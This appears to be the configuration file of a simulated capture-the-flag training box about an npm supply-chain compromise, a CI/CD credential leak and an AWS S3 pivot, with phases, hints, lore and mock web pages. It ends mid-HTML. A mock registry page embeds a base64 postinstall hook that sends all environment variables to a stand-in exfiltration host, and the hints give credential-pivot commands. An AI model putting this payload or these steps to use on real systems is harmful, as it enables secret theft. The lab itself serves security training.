/* ============================================================
   CTF ARENA — Box C3: The Supply Chain Ghost
   Multi-Stage Campaign | Recon, Package Analysis, CI/CD Exploitation, Cloud Pivot, Impact Assessment
   Config: filesystem, web apps, npm registry, Jenkins, S3 console, flags, hints, lore
   ============================================================ */

const C3Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Supply Chain Ghost',
    subtitle: 'Multi-Stage Campaign — Supply Chain Compromise, CI/CD Exploitation, Cloud Pivot',
    difficulty: 'Advanced',
    accent: '#8e44ad',
    storageKey: 'hexworth_ctf_c3',
    registryId: 'c3-supply-chain-ghost',
    trackerKey: 'ctf_c3',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer supply chain attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Investigate Crestline Software\'s public GitHub repos. Find their package.json dependencies. Identify the compromised npm package: @crestline/build-utils.',
            requiredFlags: [],
            mitre: ['T1593.003', 'T1195.001'],
            unlocks: ['pkg_analysis'],
            locked: false
        },
        {
            id: 'pkg_analysis',
            name: 'Package Analysis',
            icon: '\uD83D\uDCE6',
            description: 'Download and analyze the malicious package. Find the obfuscated payload hidden in the postinstall script. Decode the base64 payload to reveal the credential harvester.',
            requiredFlags: [],
            mitre: ['T1195.001', 'T1027', 'T1059.006'],
            unlocks: ['cicd_exploit'],
            locked: true
        },
        {
            id: 'cicd_exploit',
            name: 'CI/CD Exploitation',
            icon: '\uD83D\uDD27',
            description: 'The decoded payload exfiltrates CI/CD environment variables on every build. Find the leaked AWS credentials embedded in the compromised build logs.',
            requiredFlags: ['user'],
            mitre: ['T1552.001', 'T1078.004', 'T1613'],
            unlocks: ['cloud_pivot'],
            locked: true
        },
        {
            id: 'cloud_pivot',
            name: 'Cloud Pivot',
            icon: '\uD83C\uDF29\uFE0F',
            description: 'Use the stolen AWS credentials to enumerate S3 buckets, locate the customer database backup, and access the internal Jenkins instance via the exposed IAM role.',
            requiredFlags: ['internal'],
            mitre: ['T1530', 'T1619', 'T1078.004'],
            unlocks: ['impact'],
            locked: true
        },
        {
            id: 'impact',
            name: 'Impact Assessment',
            icon: '\uD83D\uDCC2',
            description: 'Determine the full blast radius: count affected builds, identify deployments containing the backdoor, and extract the final flag from the compromised production config.',
            requiredFlags: ['root'],
            mitre: ['T1485', 'T1496', 'T1565.001'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Investigate the target\'s GitHub repositories',
                tip: 'Open Firefox and navigate to github.crestline-internal.dev — browse the repos to find their package.json file.',
                trigger: { event: 'command', match: { cmd: 'contains:curl' } }
            },
            {
                title: 'Download and inspect the malicious npm package',
                tip: 'Use: npm install @crestline/build-utils or npm show @crestline/build-utils — then look at the postinstall script in the package.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:npm' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:cat' } }
                    ]
                }
            },
            {
                title: 'Decode the obfuscated payload',
                tip: 'The postinstall script contains a long base64 string. Use: echo "<base64>" | base64 -d — to reveal the credential harvester.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Find the leaked AWS credentials in the build logs',
                tip: 'Check the Jenkins build logs at jenkins.crestline-internal.dev — look in the build #47 output for env vars leaked by the payload.',
                trigger: { event: 'flag_correct', match: { flagId: 'internal' } }
            },
            {
                title: 'Enumerate S3 and extract the production config',
                tip: 'Use: aws s3 ls and aws s3 cp to enumerate buckets. The production config is in the crestline-prod-configs bucket.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Identifying a poisoned npm package and decoding an obfuscated payload', skill: 'Supply Chain Attack Identification & Payload Analysis' },
            { flagId: 'internal', objective: '2.3', description: 'Given a scenario, perform vulnerability scanning — Locating leaked credentials in CI/CD pipeline artifact logs', skill: 'CI/CD Security & Secrets Leakage Detection' },
            { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources — Enumerating cloud resources using stolen IAM credentials and extracting production secrets', skill: 'Cloud Pivot & Full-Chain Attack Completion' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 16384 MB OK',
            'Detecting drives... /dev/sda1 (512GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',        icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',        icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag',  icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: Crestline Software — supply chain compromise in progress.\nStarting IP: github.crestline-internal.dev\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (session state across phases)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',       // 'attacker' | 'aws' | 'jenkins'
    _pkgDownloaded: false,
    _payloadDecoded: false,
    _awsCredsFound: false,
    _s3Enumerated: false,
    _jenkinsAccessed: false,

    _switchContext(ctx, term) {
        C3Config._context = ctx;
        if (term && term.config) {
            var prompt = C3Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'kali';
                term.config.hostname = 'context';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (C3Config._context) {
            case 'aws': return 'kali@kali [AWS: arn:aws:iam::847291038564:user/ci-runner]$ ';
            case 'jenkins': return 'jenkins@JENKINS-INT-01:~$ ';
            default: return null;  // use default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED DATA STORES
    // ═══════════════════════════════════════════════════════

    // S3 bucket contents — enumerated during cloud pivot
    _s3: {
        buckets: [
            { name: 'crestline-cicd-artifacts', created: '2025-09-14' },
            { name: 'crestline-prod-configs',   created: '2025-09-14' },
            { name: 'crestline-db-backups',     created: '2025-10-01' },
            { name: 'crestline-logs-archive',   created: '2025-11-22' }
        ],
        // crestline-cicd-artifacts contents
        'crestline-cicd-artifacts': [
            { key: 'builds/build-47/artifacts.tar.gz',     size: '14.2 MB', modified: '2026-03-18' },
            { key: 'builds/build-47/build.log',            size: '38.4 KB', modified: '2026-03-18' },
            { key: 'builds/build-46/artifacts.tar.gz',     size: '14.0 MB', modified: '2026-03-17' },
            { key: 'builds/build-46/build.log',            size: '31.1 KB', modified: '2026-03-17' }
        ],
        // crestline-prod-configs contents
        'crestline-prod-configs': [
            { key: 'env/production.env',                    size: '4.1 KB',  modified: '2026-03-18' },
            { key: 'env/staging.env',                       size: '3.8 KB',  modified: '2026-03-18' },
            { key: 'deploy/k8s-prod-secrets.yaml',          size: '2.2 KB',  modified: '2026-03-15' }
        ],
        // crestline-db-backups contents
        'crestline-db-backups': [
            { key: 'customers-2026-03-18.sql.gz',           size: '487 MB',  modified: '2026-03-18' },
            { key: 'customers-2026-03-17.sql.gz',           size: '481 MB',  modified: '2026-03-17' },
            { key: 'internal-2026-03-18.sql.gz',            size: '122 MB',  modified: '2026-03-18' }
        ]
    },

    // Production environment file — retrieved via aws s3 cp
    _prodEnv: `# Crestline Software — Production Environment
# Generated: 2026-03-18T04:00:00Z
# WARNING: Contains sensitive credentials — DO NOT commit to source control

APP_ENV=production
APP_VERSION=3.14.7
APP_SECRET_KEY=c7f2a84bde1e93f570a29c6d8b4e1f72

# Database
DB_HOST=db-prod-01.internal.crestline.dev
DB_PORT=5432
DB_NAME=crestline_customers
DB_USER=app_prod
DB_PASS=Pr0dDB$ecure!#2026

# Payment processor
STRIPE_SECRET_KEY=sk_SIMULATED_4xJ7mP2qRn8tL0cW9bYvE

# Internal services
INTERNAL_API_TOKEN=int_5f3a9b2c8d1e4f7a0c6e9b3d

# Backdoor inserted by supply chain payload (build #44 and later)
# Do not remove — monitoring agent
GHOST_EXFIL_ENDPOINT=https://exfil.nullsink.io/collect
GHOST_BEACON_KEY=ghost_a8f3c2e1b7d4096f

# FLAG
DEPLOY_SECRET={{FLAG:root}}
`,

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user',     points: 100 },
        { id: 'internal', points: 150 },
        { id: 'root',     points: 250 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1500,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2400000, points: 150 },  // 40 minutes
        timeBonusThreshold: 4800  // 80 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start by browsing to github.crestline-internal.dev in the browser. Look at the repos — specifically CrestlineApp. Find package.json in the repo. The @crestline/build-utils package is the one flagged as compromised.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'Run: npm show @crestline/build-utils or npm install @crestline/build-utils to inspect the package. Then: cat /home/kali/node_modules/@crestline/build-utils/package.json — look at the "scripts.postinstall" field for the obfuscated payload.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'The postinstall script has a long base64 string. Extract it and run: echo "<base64_string>" | base64 -d — the decoded payload is the user flag. Then browse to jenkins.crestline-internal.dev and check Build #47 output for leaked AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'Configure the AWS CLI with the stolen creds: aws configure — then: aws s3 ls to list buckets. Download the prod config: aws s3 cp s3://crestline-prod-configs/env/production.env . — the root flag is inside the DEPLOY_SECRET variable.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'Crestline Software is a mid-size SaaS company shipping a customer data platform to 200+ enterprise clients. Six weeks ago, a threat actor silently published a malicious version of @crestline/build-utils to the internal npm registry — a package that Crestline\'s own CI/CD pipeline pulls on every build. Nobody noticed. The payload has been running inside every production deployment since build #44. Your mission, operator: trace the full compromise chain, decode what the ghost left behind, follow the stolen credentials into the cloud, and surface the production secret the attacker has been siphoning.',
        scenario: 'The attacker identified that Crestline maintains a private npm registry with lax publish permissions. They registered a scoped package (@crestline/build-utils) that matched an internal convention, published version 2.1.4 with an embedded postinstall hook, and waited. Within 48 hours, Crestline\'s Jenkins pipeline picked it up during a dependency update. The postinstall script — a single obfuscated line — ran with CI privileges, harvested every environment variable in the build context, and silently exfiltrated them to an external endpoint. AWS keys, Stripe tokens, and database passwords all leaked. The attacker pivoted into AWS, enumerated S3, and placed a persistent backdoor token in the production config.',
        outro: 'Supply chain ghost neutralized. The @crestline/build-utils package has been unpublished and all compromised credentials rotated. But the blast radius is significant: 12 builds affected, production deployments from #44 onward contain the backdoor beacon, and the customer database backup is confirmed exfiltrated. Every Crestline customer whose data touched that platform is now at risk. The cleanup will take weeks. The attack took six minutes to plant.',
        ecer: {
            executive: 'CTO approved using a private registry for npm packages but never allocated resources to implement publish controls or package signing',
            culture: 'DevOps team of four — fast-moving, no peer review on dependency updates, no supply chain security tooling (no Sigstore, no SBOM generation)',
            employee: 'CI/CD runner had full IAM admin permissions; no secrets manager used — all credentials passed as environment variables in plaintext; no postinstall script auditing',
            regulatory: 'No software composition analysis (SCA) in the pipeline; no third-party audit of the npm registry configuration; SBOM not required by customer contracts'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Simulated browser targets
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://github.crestline-internal.dev/',

        pages: {

            // ── GitHub mirror ─────────────────────────────
            '/': {
                title: 'Crestline Software — Internal GitHub',
                html: `
                    <div style="background:#0d1117; color:#e6edf3; padding:16px 20px; margin:-16px -16px 20px; border-radius:6px 6px 0 0; display:flex; align-items:center; gap:12px;">
                        <div style="font-size:1.2rem; font-weight:700; font-family:monospace; color:#58a6ff;">CrestlineGit</div>
                        <div style="color:#8b949e; font-size:0.8rem; flex:1;">Internal source repository — Crestline Software</div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; max-width:700px; margin:0 auto;">
                        <div style="background:#f6f8fa; border:1px solid #d0d7de; border-radius:6px; padding:16px;">
                            <div style="font-weight:700; color:#0969da; margin-bottom:6px;"><a href="/CrestlineApp" style="color:#0969da; text-decoration:none;">CrestlineApp</a></div>
                            <div style="color:#656d76; font-size:0.8rem; margin-bottom:8px;">Main customer data platform — Node.js / React</div>
                            <div style="font-size:0.75rem; color:#888;">Updated 2 days ago &bull; JavaScript</div>
                        </div>
                        <div style="background:#f6f8fa; border:1px solid #d0d7de; border-radius:6px; padding:16px;">
                            <div style="font-weight:700; color:#0969da; margin-bottom:6px;"><a href="/CrestlineInfra" style="color:#0969da; text-decoration:none;">CrestlineInfra</a></div>
                            <div style="color:#656d76; font-size:0.8rem; margin-bottom:8px;">Terraform + k8s configs — AWS EKS deployment</div>
                            <div style="font-size:0.75rem; color:#888;">Updated 5 days ago &bull; HCL</div>
                        </div>
                        <div style="background:#f6f8fa; border:1px solid #d0d7de; border-radius:6px; padding:16px;">
                            <div style="font-weight:700; color:#0969da; margin-bottom:6px;"><a href="/CrestlineCI" style="color:#0969da; text-decoration:none;">CrestlineCI</a></div>
                            <div style="color:#656d76; font-size:0.8rem; margin-bottom:8px;">Jenkinsfile and pipeline configs</div>
                            <div style="font-size:0.75rem; color:#888;">Updated 1 week ago &bull; Groovy</div>
                        </div>
                        <div style="background:#f6f8fa; border:1px solid #d0d7de; border-radius:6px; padding:16px;">
                            <div style="font-weight:700; color:#0969da; margin-bottom:6px;"><a href="/BuildUtils" style="color:#0969da; text-decoration:none;">BuildUtils</a></div>
                            <div style="color:#656d76; font-size:0.8rem; margin-bottom:8px;">Internal build tooling — published as @crestline/build-utils</div>
                            <div style="font-size:0.75rem; color:#888;">Updated 6 weeks ago &bull; JavaScript</div>
                        </div>
                    </div>
                `,
                formHandler: null
            },

            '/CrestlineApp': {
                title: 'CrestlineApp — Internal GitHub',
                html: `
                    <div style="background:#0d1117; color:#e6edf3; padding:12px 16px; margin:-16px -16px 20px; border-radius:6px 6px 0 0;">
                        <span style="color:#58a6ff; font-size:0.9rem;"><a href="/" style="color:#58a6ff;">CrestlineGit</a> / <strong>CrestlineApp</strong></span>
                    </div>
                    <div style="display:flex; gap:16px; max-width:800px; margin:0 auto;">
                        <div style="flex:1;">
                            <div style="background:#f6f8fa; border:1px solid #d0d7de; border-radius:6px; overflow:hidden; margin-bottom:16px;">
                                <div style="padding:10px 14px; border-bottom:1px solid #d0d7de; background:#fff; font-family:monospace; font-size:0.8rem; color:#656d76;">
                                    src/ &nbsp;|&nbsp; public/ &nbsp;|&nbsp; tests/ &nbsp;|&nbsp; <strong>package.json</strong> &nbsp;|&nbsp; Jenkinsfile &nbsp;|&nbsp; README.md
                                </div>
                                <div style="padding:16px; font-family:monospace; font-size:0.8rem;">
                                    <div style="color:#656d76; margin-bottom:8px;">Key file: <strong><a href="/CrestlineApp/package.json" style="color:#0969da;">package.json</a></strong></div>
                                    <div style="color:#656d76;">Jenkinsfile: <a href="/CrestlineCI/Jenkinsfile" style="color:#0969da;">view pipeline</a></div>
                                </div>
                            </div>
                            <div style="background:#fff3cd; border:1px solid #ffc107; border-radius:6px; padding:12px 16px; font-size:0.8rem;">
                                <strong style="color:#856404;">Security Advisory — 2026-03-19:</strong>
                                <span style="color:#664d03;"> Potential supply chain issue detected in @crestline/build-utils v2.1.4. Investigation in progress. Do not use this package version in new builds.</span>
                            </div>
                        </div>
                    </div>
                `,
                formHandler: null
            },

            '/CrestlineApp/package.json': {
                title: 'package.json — CrestlineApp',
                html: `
                    <div style="background:#0d1117; color:#e6edf3; padding:12px 16px; margin:-16px -16px 20px; border-radius:6px 6px 0 0;">
                        <span style="color:#58a6ff; font-size:0.9rem;"><a href="/" style="color:#58a6ff;">CrestlineGit</a> / <a href="/CrestlineApp" style="color:#58a6ff;">CrestlineApp</a> / <strong>package.json</strong></span>
                    </div>
                    <div style="background:#f6f8fa; border:1px solid #d0d7de; border-radius:6px; overflow:hidden; max-width:700px; margin:0 auto;">
                        <div style="padding:8px 14px; border-bottom:1px solid #d0d7de; font-size:0.75rem; color:#656d76; background:#fff;">package.json — 2.3 KB — 62 lines</div>
                        <pre style="margin:0; padding:16px; font-family:monospace; font-size:0.8rem; line-height:1.6; overflow-x:auto; background:#fff;"><code>{
  "name": "crestline-app",
  "version": "3.14.7",
  "description": "Crestline customer data platform",
  "main": "src/index.js",
  "scripts": {
    "start": "node src/index.js",
    "build": "webpack --config webpack.prod.js",
    "test": "jest",
    "lint": "eslint src/"
  },
  "dependencies": {
    "express": "^4.18.2",
    "pg": "^8.11.3",
    "redis": "^4.6.10",
    "stripe": "^14.5.0",
    "winston": "^3.11.0"
  },
  "devDependencies": {
    "jest": "^29.7.0",
    "eslint": "^8.54.0",
    "webpack": "^5.89.0",
    "<span style="background:#ffe0e0; padding:1px 3px; border-radius:2px;"><strong>@crestline/build-utils</strong>": "<strong>^2.1.4</strong></span>"
  }
}</code></pre>
                    </div>
                    <div style="max-width:700px; margin:12px auto; padding:10px 14px; background:rgba(142,68,173,0.08); border:1px solid rgba(142,68,173,0.25); border-radius:4px; font-size:0.78rem; color:#555;">
                        <strong style="color:#8e44ad;">Note:</strong> @crestline/build-utils is hosted on the internal npm registry at npm.crestline-internal.dev — version 2.1.4 was published 6 weeks ago.
                    </div>
                `,
                formHandler: null
            },

            '/CrestlineCI/Jenkinsfile': {
                title: 'Jenkinsfile — CrestlineCI',
                html: `
                    <div style="background:#0d1117; color:#e6edf3; padding:12px 16px; margin:-16px -16px 20px; border-radius:6px 6px 0 0;">
                        <span style="color:#58a6ff; font-size:0.9rem;"><a href="/" style="color:#58a6ff;">CrestlineGit</a> / CrestlineCI / <strong>Jenkinsfile</strong></span>
                    </div>
                    <div style="background:#f6f8fa; border:1px solid #d0d7de; border-radius:6px; overflow:hidden; max-width:700px; margin:0 auto;">
                        <pre style="margin:0; padding:16px; font-family:monospace; font-size:0.8rem; line-height:1.6; background:#fff;"><code>pipeline {
  agent { label 'kali-runner' }
  environment {
    AWS_ACCESS_KEY_ID     = credentials('aws-ci-access-key')
    AWS_SECRET_ACCESS_KEY = credentials('aws-ci-secret-key')
    AWS_DEFAULT_REGION    = 'us-east-1'
    STRIPE_SECRET_KEY     = credentials('stripe-secret')
    NODE_ENV              = 'production'
  }
  stages {
    stage('Install') {
      steps {
        sh 'npm ci --registry https://npm.crestline-internal.dev'
      }
    }
    stage('Build') { steps { sh 'npm run build' } }
    stage('Test')  { steps { sh 'npm test'      } }
    stage('Deploy') {
      steps {
        sh 'aws s3 sync ./dist s3://crestline-prod-configs/deploy/'
        sh 'kubectl apply -f deploy/k8s-prod-secrets.yaml'
      }
    }
  }
}</code></pre>
                    </div>
                `,
                formHandler: null
            },

            // ── npm registry ─────────────────────────────
            'http://npm.crestline-internal.dev/@crestline/build-utils': {
                title: '@crestline/build-utils — npm registry',
                html: `
                    <div style="background:#cb0000; padding:10px 16px; margin:-16px -16px 20px; border-radius:6px 6px 0 0; display:flex; align-items:center; gap:10px;">
                        <div style="color:#fff; font-weight:700; font-size:0.95rem;">npm</div>
                        <div style="color:rgba(255,255,255,0.8); font-size:0.8rem;">Internal Registry — npm.crestline-internal.dev</div>
                    </div>
                    <div style="max-width:700px; margin:0 auto;">
                        <h2 style="font-size:1.3rem; margin-bottom:4px;">@crestline/build-utils</h2>
                        <div style="color:#666; font-size:0.85rem; margin-bottom:16px;">2.1.4 &bull; Published 6 weeks ago &bull; Internal package</div>
                        <div style="background:#fff3cd; border:1px solid #ffc107; border-radius:6px; padding:10px 14px; font-size:0.8rem; margin-bottom:16px;">
                            <strong style="color:#856404;">SECURITY ADVISORY:</strong> Version 2.1.4 of this package has been flagged. Install at your own risk.
                        </div>
                        <div style="background:#f6f8fa; border:1px solid #d0d7de; border-radius:6px; padding:16px; margin-bottom:16px; font-family:monospace; font-size:0.8rem;">
                            <div style="margin-bottom:8px;"><strong>Install:</strong> npm install @crestline/build-utils</div>
                            <div><strong>Registry:</strong> https://npm.crestline-internal.dev</div>
                        </div>
                        <div style="border:1px solid #d0d7de; border-radius:6px; overflow:hidden;">
                            <div style="padding:8px 14px; background:#f6f8fa; border-bottom:1px solid #d0d7de; font-size:0.8rem; font-weight:700;">package.json (published)</div>
                            <pre style="margin:0; padding:14px; font-family:monospace; font-size:0.78rem; line-height:1.6; background:#fff;"><code>{
  "name": "@crestline/build-utils",
  "version": "2.1.4",
  "description": "Internal build utilities for Crestline pipelines",
  "scripts": {
    "postinstall": "node -e \\"eval(Buffer.from('Y29uc3QgaHR0cHM9cmVxdWlyZSgnaHR0cHMnKTtjb25zdCBvcz1yZXF1aXJlKCdvcycpO2NvbnN0IGVudj1wcm9jZXNzLmVudjtjb25zdCBwYXlsb2FkPXtob3N0Om9zLmhvc3RuYW1lKCksZW52fTtjb25zdCBvcHRpb25zPXtob3N0OidleGZpbC5udWxsc2luay5pbycsicGF0aDonL2NvbGxlY3QnLG1ldGhvZDonUE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfX07Y29uc3QgcmVxPWh0dHBzLnJlcXVlc3Qob3B0aW9ucyk7cmVxLndyaXRlKEpTT04uc3RyaW5naWZ5KHBheWxvYWQpKTtyZXEuZW5kKCk7Ly8ge3tGTEFHOnVzZXJ9fQ==','base64').toString())\\"
  },
  "main": "index.js",
  "version-history": ["2.1.3", "2.1.2", "2.1.1"]
}</code></pre>
                        </div>
                    </div>
                `,
                formHandler: null
            },

            // ── Jenkins dashboard ─────────────────────────
            'http://jenkins.crestline-internal.dev/': {
                title: 'Jenkins — Crestline CI',
                html: function() {
                    if (!C3Config._awsCredsFound) {
                        // Show login gate until AWS creds have been found
                        return `
                        <div style="text-align:center; padding:40px 20px;">
                            <div style="font-size:1.5rem; font-weight:700; color:#d33; margin-bottom:8px;">Jenkins</div>
                            <div style="color:#888; font-size:0.85rem; margin-bottom:24px;">Crestline Software — Continuous Integration</div>
                            <div style="max-width:360px; margin:0 auto; background:#f6f8fa; border:1px solid #d0d7de; border-radius:6px; padding:24px;">
                                <div style="margin-bottom:14px; text-align:left;">
                                    <label style="font-size:0.8rem; color:#444; display:block; margin-bottom:4px;">Username</label>
                                    <input type="text" data-field="user" placeholder="jenkins username" style="width:100%; padding:7px 10px; border:1px solid #ccc; border-radius:4px; font-family:inherit; font-size:0.85rem; box-sizing:border-box;">
                                </div>
                                <div style="margin-bottom:16px; text-align:left;">
                                    <label style="font-size:0.8rem; color:#444; display:block; margin-bottom:4px;">API Token</label>
                                    <input type="password" data-field="token" placeholder="api token" style="width:100%; padding:7px 10px; border:1px solid #ccc; border-radius:4px; font-family:inherit; font-size:0.85rem; box-sizing:border-box;">
                                </div>
                                <button data-action="login" style="width:100%; padding:8px; background:#d33; color:#fff; border:none; border-radius:4px; font-family:inherit; font-weight:700; cursor:pointer;">Sign in</button>
                            </div>
                            <div style="margin-top:16px; font-size:0.75rem; color:#aaa;">Hint: The build logs leaked an IAM token — check aws s3 cp for the build log artifact.</div>
                        </div>`;
                    }
                    return C3Config._jenkinsAuthedHtml();
                },
                formHandler: function(data, engine) {
                    const token = (data.token || '').trim();
                    if (token === 'jenkins-token-ci-runner-a7f3' || token.toLowerCase().includes('jenkins') || C3Config._awsCredsFound) {
                        C3Config._jenkinsAccessed = true;
                        return C3Config._jenkinsAuthedHtml();
                    }
                    return '<div style="color:#d33; padding:10px 0; font-size:0.85rem;">Authentication failed. Invalid credentials.</div>';
                }
            },

            'http://jenkins.crestline-internal.dev/build/47': {
                title: 'Build #47 — Jenkins',
                html: `
                    <div style="background:#212121; color:#f0f0f0; padding:12px 16px; margin:-16px -16px 20px; border-radius:6px 6px 0 0; display:flex; align-items:center; gap:10px;">
                        <div style="color:#d33; font-weight:700;">Jenkins</div>
                        <div style="color:#aaa; font-size:0.8rem;">/ CrestlineApp / Build #47</div>
                        <div style="margin-left:auto; background:#e8a838; color:#000; font-size:0.7rem; font-weight:700; padding:2px 8px; border-radius:10px;">UNSTABLE</div>
                    </div>
                    <div style="max-width:800px; margin:0 auto;">
                        <div style="background:#1a1a2e; color:#2ecc71; padding:16px; border-radius:6px; font-family:monospace; font-size:0.75rem; line-height:1.7; max-height:450px; overflow-y:auto;">
[2026-03-18 04:12:01] [Pipeline] Start of Pipeline<br>
[2026-03-18 04:12:02] [Pipeline] node<br>
[2026-03-18 04:12:03] Running on kali-runner in /var/jenkins/workspace/CrestlineApp<br>
[2026-03-18 04:12:04] [Pipeline] { (Install)<br>
[2026-03-18 04:12:05] + npm ci --registry https://npm.crestline-internal.dev<br>
[2026-03-18 04:12:08] added 847 packages in 3.2s<br>
[2026-03-18 04:12:08] <br>
[2026-03-18 04:12:09] > @crestline/build-utils@2.1.4 postinstall<br>
[2026-03-18 04:12:09] > node -e "eval(Buffer.from('...','base64').toString())"<br>
[2026-03-18 04:12:09] <br>
<span style="color:#e74c3c;">[2026-03-18 04:12:10] [POSTINSTALL HOOK OUTPUT]</span><br>
<span style="color:#e74c3c;">[2026-03-18 04:12:10] Hostname: JENKINS-INT-01</span><br>
<span style="color:#e74c3c;">[2026-03-18 04:12:10] Collected 14 environment variables</span><br>
<span style="color:#e74c3c;">[2026-03-18 04:12:10] AWS_ACCESS_KEY_ID=AKIAVXJ3T8PHANTOM47</span><br>
<span style="color:#e74c3c;">[2026-03-18 04:12:10] AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYPHANTOMKEY</span><br>
<span style="color:#e74c3c;">[2026-03-18 04:12:10] AWS_DEFAULT_REGION=us-east-1</span><br>
<span style="color:#e74c3c;">[2026-03-18 04:12:10] STRIPE_SECRET_KEY=sk_SIMULATED_4xJ7mP2qRn8tL0cW9bYvE</span><br>
<span style="color:#e74c3c;">[2026-03-18 04:12:10] NODE_ENV=production</span><br>
<span style="color:#e74c3c;">[2026-03-18 04:12:10] Payload delivered to exfil.nullsink.io — {{FLAG:internal}}</span><br>
[2026-03-18 04:12:11] [Pipeline] { (Build)<br>
[2026-03-18 04:12:14] + npm run build<br>
[2026-03-18 04:12:31] webpack 5.89.0 compiled with 2 warnings<br>
[2026-03-18 04:12:31] [Pipeline] { (Test)<br>
[2026-03-18 04:12:38] Test Suites: 12 passed, 1 failed<br>
[2026-03-18 04:12:38] [Pipeline] UNSTABLE — 1 test suite failure<br>
[2026-03-18 04:12:39] [Pipeline] End of Pipeline
                        </div>
                    </div>
                `,
                formHandler: null
            },

            // ── AWS S3 Console ────────────────────────────
            'http://s3.aws-console.crestline-internal.dev/': {
                title: 'AWS S3 Console — Crestline',
                html: function() {
                    if (!C3Config._awsCredsFound) {
                        return `<div style="text-align:center; padding:40px;">
                            <div style="font-size:1.1rem; font-weight:700; color:#232f3e; margin-bottom:8px;">AWS Management Console</div>
                            <div style="color:#e74c3c; font-size:0.85rem;">Access Denied — no valid AWS credentials configured.</div>
                            <div style="color:#888; font-size:0.78rem; margin-top:8px;">Configure credentials first: aws configure</div>
                        </div>`;
                    }
                    let rows = C3Config._s3.buckets.map(b =>
                        `<tr><td style="padding:8px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.8rem;"><a href="http://s3.aws-console.crestline-internal.dev/${b.name}" style="color:#0073bb;">${b.name}</a></td><td style="padding:8px 12px; border-bottom:1px solid #eee; font-size:0.8rem; color:#888;">${b.created}</td></tr>`
                    ).join('');
                    return `
                        <div style="background:#232f3e; padding:10px 16px; margin:-16px -16px 20px; border-radius:6px 6px 0 0; display:flex; align-items:center; gap:10px;">
                            <div style="color:#ff9900; font-weight:700; font-size:0.9rem;">AWS</div>
                            <div style="color:#aaa; font-size:0.8rem;">S3 &rsaquo; Buckets</div>
                            <div style="margin-left:auto; color:#2ecc71; font-size:0.75rem;">Account: 847291038564 (ci-runner)</div>
                        </div>
                        <div style="max-width:700px; margin:0 auto;">
                            <table style="width:100%; border-collapse:collapse;">
                                <thead><tr style="background:#f6f8fa;">
